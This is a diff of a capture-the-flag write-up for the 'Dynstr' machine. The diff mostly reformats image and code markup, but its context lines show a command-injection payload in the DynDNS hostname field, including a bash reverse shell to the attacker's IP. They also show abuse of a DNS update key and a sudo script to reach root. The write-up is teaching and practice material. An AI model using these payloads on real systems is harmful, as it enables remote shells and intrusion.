@@ -20,15 +20,15 @@ PORT   STATE SERVICE
 
 This was a corporate page for a DNS service:
 
-<figure><img src="../../../.gitbook/assets/image (2729).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2729).png>)
 
 At the bottom, it appears we have to add `dyna.htb` to the `/etc/hosts` file:
 
-<figure><img src="../../../.gitbook/assets/image (2554).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2554).png>)
 
 Also, there is some information on the page:
 
-<figure><img src="../../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(594).png>)
 
 Since DNS is open, we can use `dig`:
 
@@ -106,7 +106,7 @@ badauth
 
 Weird. Googling "badauth DNS" shows us ths is an error caused by a DNS software called DynDns:
 
-<figure><img src="../../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(118).png>)
 
 Googling `/nic/update` reveals that this is actually an API that we can access:
 
@@ -136,13 +136,13 @@ $ curl -G --data-urlencode 'hostname=$(curl 168431117/rce).no-ip.htb' http://dyn
 911 [nsupdate failed]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(600).png>)
 
 ```
 $ curl -G --data-urlencode 'hostname=$(bash -c "bash -i >& /dev/tcp/168431117/4444 0>&1").no-ip.htb' http://dynadns:sndanyd@dyna.htb/nic/updat
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1027).png>)
 
 ## Privilege Escalation
 
@@ -181,16 +181,14 @@ drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15  2021 ..
 
 When we read the debug script, we can find a SSH private key within it:
 
-<figure><img src="../../../.gitbook/assets/image (3215).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3215).png>)
 
 I tried to use this to `ssh` in as the user, but it seems that we are being blocked. On enumeration of the `authorized_keys` file, we cansee that it only accepts requests from `*.infra.dyna.htb`.
 
-{% code overflow="wrap" %}
 ```
 www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys 
 from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
 ```
-{% endcode %}
 
 The next step here would be to update the DNS records using `nsupdate` such that a new domain would point to our machine and allow us to `ssh` in using the key we found. The hint here is to use `bind`, and this would require a key file from `/etc/bind`.
 
@@ -217,7 +215,7 @@ www-data@dynstr:/etc/bind$ nsupdate -k infra.key
 
 Afterwards, we can `ssh` in as the user:
 
-<figure><img src="../../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(407).png>)
 
 ### Sudo
 
@@ -321,4 +319,4 @@ sudo /usr/local/bin/bindmgr.sh
 /etc/bind/named.bindmgr/bash -p
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3346).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3346).png>)
